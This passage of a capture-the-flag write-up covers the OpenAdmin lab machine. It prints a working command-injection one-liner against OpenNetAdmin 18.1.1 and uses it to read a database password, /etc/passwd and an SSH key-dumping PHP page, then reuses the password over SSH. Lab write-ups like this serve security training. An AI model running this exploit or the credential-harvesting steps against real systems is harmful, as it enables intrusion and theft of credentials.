-&lt;span class="code-line"&gt;------------------------ ----------------------------------------&lt;/span&gt;
-&lt;span class="code-line"&gt;OpenNetAdmin 13.03.01 - | exploits/php/webapps/26682.txt&lt;/span&gt;
-&lt;span class="code-line"&gt;OpenNetAdmin 18.1.1 - R | exploits/php/webapps/47691.sh&lt;/span&gt;
-&lt;span class="code-line"&gt;------------------------ ------------------------------------&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The script was not working out of the box for me so I "rewrote" it (it is a
-oneliner in bash).&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;curl --silent -d &lt;span class="s2"&gt;&amp;quot;xajax=window_submit&amp;amp;xajaxr=1574117726710&amp;amp;xajaxargs[]=tooltips&amp;amp;xajaxargs[]=ip%3D%3E;echo \&amp;quot;BEGIN\&amp;quot;;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;;echo \&amp;quot;END\&amp;quot;&amp;amp;xajaxargs[]=ping&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://10.10.10.171/ona/&amp;quot;&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n -e &lt;span class="s1"&gt;&amp;#39;/BEGIN/,/END/ p&amp;#39;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We start enumerating the box as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;whoami&amp;#39; &lt;/span&gt;
-&lt;span class="code-line"&gt;                  &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
-&lt;span class="code-line"&gt;  www-data&lt;/span&gt;
-&lt;span class="code-line"&gt;  END&lt;/span&gt;
-&lt;span class="code-line"&gt;sh ona_rce.sh &amp;#39;ls -al&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
-&lt;span class="code-line"&gt;total 72&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x 10 www-data www-data 4096 Jan  7 14:41 .&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..&lt;/span&gt;
-&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config&lt;/span&gt;
-&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php&lt;/span&gt;
-&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include&lt;/span&gt;
-&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local&lt;/span&gt;
-&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php&lt;/span&gt;
-&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc&lt;/span&gt;
-&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We notice that the file are from January 2018. So we just filter on file older
-that 30 days. That allow us to find a configuration file for the database
-containing a password.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;find ../../ -mtime -30 2&amp;gt;/dev/null | grep -Ev &amp;quot;^/proc&amp;quot;&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
-&lt;span class="code-line"&gt;../../&lt;/span&gt;
-&lt;span class="code-line"&gt;../../priv.save&lt;/span&gt;
-&lt;span class="code-line"&gt;../../ona/www&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;sh ona_rce.sh &amp;#39;cat ../../ona/www/local/config/database_settings.inc.php&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
-&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;$ona_contexts=array (&lt;/span&gt;
-&lt;span class="code-line"&gt;  &amp;#39;DEFAULT&amp;#39; =&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;  array (&lt;/span&gt;
-&lt;span class="code-line"&gt;    &amp;#39;databases&amp;#39; =&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;    array (&lt;/span&gt;
-&lt;span class="code-line"&gt;      0 =&amp;gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;      array (&lt;/span&gt;
-&lt;span class="code-line"&gt;        &amp;#39;db_type&amp;#39; =&amp;gt; &amp;#39;mysqli&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;        &amp;#39;db_host&amp;#39; =&amp;gt; &amp;#39;localhost&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;        &amp;#39;db_login&amp;#39; =&amp;gt; &amp;#39;ona_sys&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;        &amp;#39;db_passwd&amp;#39; =&amp;gt; &amp;#39;n1nj4W4rri0R!&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;        &amp;#39;db_database&amp;#39; =&amp;gt; &amp;#39;ona_default&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;        &amp;#39;db_debug&amp;#39; =&amp;gt; false,&lt;/span&gt;
-&lt;span class="code-line"&gt;      ),&lt;/span&gt;
-&lt;span class="code-line"&gt;    ),&lt;/span&gt;
-&lt;span class="code-line"&gt;    &amp;#39;description&amp;#39; =&amp;gt; &amp;#39;Default data context&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;    &amp;#39;context_color&amp;#39; =&amp;gt; &amp;#39;#D3DBFF&amp;#39;,&lt;/span&gt;
-&lt;span class="code-line"&gt;  ),&lt;/span&gt;
-&lt;span class="code-line"&gt;);&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;?&amp;gt;END&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;We want to try this password against SSH users but we don't know them. We can
-just cat &lt;code&gt;/etc/passwd&lt;/code&gt; to get a list of the system's user.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;cat /etc/passwd&amp;#39;&lt;/span&gt;
-&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
-&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
-&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
-&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
-&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
-&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
-&lt;span class="code-line"&gt;jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash&lt;/span&gt;
-&lt;span class="code-line"&gt;mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
-&lt;span class="code-line"&gt;joanna:x:1001:1001:,,,:/home/joanna:/bin/bash&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;I tried to logged as &lt;code&gt;joanna&lt;/code&gt; first but the password was &lt;code&gt;jimmy&lt;/code&gt;'s.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh jimmy@10.10.10.171&lt;/span&gt;
-&lt;span class="code-line"&gt;jimmy@openadmin:~$ id&lt;/span&gt;
-&lt;span class="code-line"&gt;uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;h2 id="internal"&gt;Internal&lt;/h2&gt;
-&lt;p&gt;We notice that we are part of the &lt;code&gt;internal&lt;/code&gt; group. Therefore we look for files
-belonging to this specific group and found some "internal" directory containing
-three PHP script.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:~$ find / -group internal 2&amp;gt; /dev/null&lt;/span&gt;
-&lt;span class="code-line"&gt;/var/www/internal&lt;/span&gt;
-&lt;span class="code-line"&gt;/var/www/internal/main.php&lt;/span&gt;
-&lt;span class="code-line"&gt;/var/www/internal/logout.php&lt;/span&gt;
-&lt;span class="code-line"&gt;/var/www/internal/index.php&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;main.php:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: /index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Open Admin Trusted&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# OpenAdmin&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat /home/joanna/.ssh/id_rsa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;$output&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;h3&amp;gt;Don&amp;#39;t forget your &amp;quot;ninja&amp;quot; password&amp;lt;/h3&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;Click here to logout &amp;lt;a href=&amp;quot;logout.php&amp;quot; tite = &amp;quot;Logout&amp;quot;&amp;gt;Session&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;p&gt;index.php&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;ob_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;// error_reporting(E_ALL);&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;// ini_set(&amp;quot;display_errors&amp;quot;, 1);&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;html lang = &amp;quot;en&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;title&amp;gt;Tutorialspoint.com&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;link href = &amp;quot;css/bootstrap.min.css&amp;quot; rel = &amp;quot;stylesheet&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;h2&amp;gt;Enter Username and Password&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;div class = &amp;quot;container form-signin&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;h2 class=&amp;quot;featurette-heading&amp;quot;&amp;gt;Login Restricted.&amp;lt;span class=&amp;quot;text-muted&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;          &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;            &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;              &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jimmy&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha512&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;                  &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jimmy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;                  &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: /main.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;              &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;                  &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Wrong username or password.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;              &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;            &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;        &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;/div&amp;gt; &amp;lt;!-- /container --&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;div class = &amp;quot;container&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;form class = &amp;quot;form-signin&amp;quot; role = &amp;quot;form&amp;quot;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;            action = &amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;htmlspecialchars&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHP_SELF&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;            &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;quot; method = &amp;quot;post&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;h4 class = &amp;quot;form-signin-heading&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;input type = &amp;quot;text&amp;quot; class = &amp;quot;form-control&amp;quot;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;username&amp;quot;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;              required autofocus&amp;gt;&amp;lt;/br&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;input type = &amp;quot;password&amp;quot; class = &amp;quot;form-control&amp;quot;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;password&amp;quot; required&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;button class = &amp;quot;btn btn-lg btn-primary btn-block&amp;quot; type = &amp;quot;submit&amp;quot;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;login&amp;quot;&amp;gt;Login&amp;lt;/button&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;
